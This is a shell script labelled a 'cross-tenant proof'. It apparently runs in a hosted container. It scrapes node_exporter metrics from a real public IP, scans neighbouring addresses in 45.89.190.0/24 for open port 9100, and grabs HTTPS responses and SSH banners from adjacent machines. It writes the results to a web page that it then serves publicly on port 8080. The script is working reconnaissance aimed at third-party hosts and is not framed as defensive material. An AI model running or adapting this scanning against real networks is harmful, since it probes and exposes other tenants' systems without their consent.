#!/bin/sh
echo "=== v11: cross-tenant proof ===" > /app/index.html
echo "Time: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> /app/index.html
echo "" >> /app/index.html

echo "=== OUR IP ===" >> /app/index.html
ip -4 addr show eth1 >> /app/index.html 2>&1
echo "" >> /app/index.html

# === NODE EXPORTER (cross-tenant metrics) ===
echo "=== NODE EXPORTER: 45.89.190.119:9100 ===" >> /app/index.html
curl -s -m 5 "http://45.89.190.119:9100/metrics" 2>&1 | head -50 >> /app/index.html
echo "" >> /app/index.html
echo "--- hostname from metrics ---" >> /app/index.html
curl -s -m 5 "http://45.89.190.119:9100/metrics" 2>&1 | grep "node_uname_info" >> /app/index.html
echo "" >> /app/index.html

# === NODE EXPORTER SCAN wider range ===
echo "=== NODE EXPORTER SCAN: 45.89.190.100-140 ===" >> /app/index.html
for i in $(seq 100 140); do
  R=$(curl -s -m 1 -o /dev/null -w "%{http_code}" "http://45.89.190.$i:9100/metrics" 2>/dev/null)
  if [ "$R" != "000" ]; then
    echo "45.89.190.$i:9100 → HTTP $R" >> /app/index.html
    curl -s -m 2 "http://45.89.190.$i:9100/metrics" 2>&1 | grep "node_uname_info" >> /app/index.html
    echo "" >> /app/index.html
  fi
done
echo "" >> /app/index.html

# === CURL SOME ADJACENT WEB SERVICES ===
echo "=== WEB SERVICES: adjacent VMs ===" >> /app/index.html
for ip in "45.89.190.103" "45.89.190.107" "45.89.190.113" "45.89.190.132"; do
  echo "--- $ip ---" >> /app/index.html
  curl -sk -m 3 "https://$ip/" -H "Host: test" 2>&1 | head -5 >> /app/index.html
  echo "" >> /app/index.html
done
echo "" >> /app/index.html

# === SSH BANNERS adjacent ===
echo "=== SSH BANNERS ===" >> /app/index.html
for ip in "45.89.190.104" "45.89.190.107" "45.89.190.122" "45.89.190.125"; do
  BANNER=$(echo "" | nc -w2 $ip 22 2>/dev/null | head -1)
  [ -n "$BANNER" ] && echo "$ip: $BANNER" >> /app/index.html
done
echo "" >> /app/index.html

# === WIDER NODE_EXPORTER SCAN ===
echo "=== NODE EXPORTER: 45.89.190.0-99 ===" >> /app/index.html
for i in $(seq 1 99); do
  nc -z -w1 45.89.190.$i 9100 2>/dev/null && echo "45.89.190.$i:9100 OPEN" >> /app/index.html
done
echo "" >> /app/index.html

echo "=== done $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" >> /app/index.html
cd /app && python3 -m http.server 8080
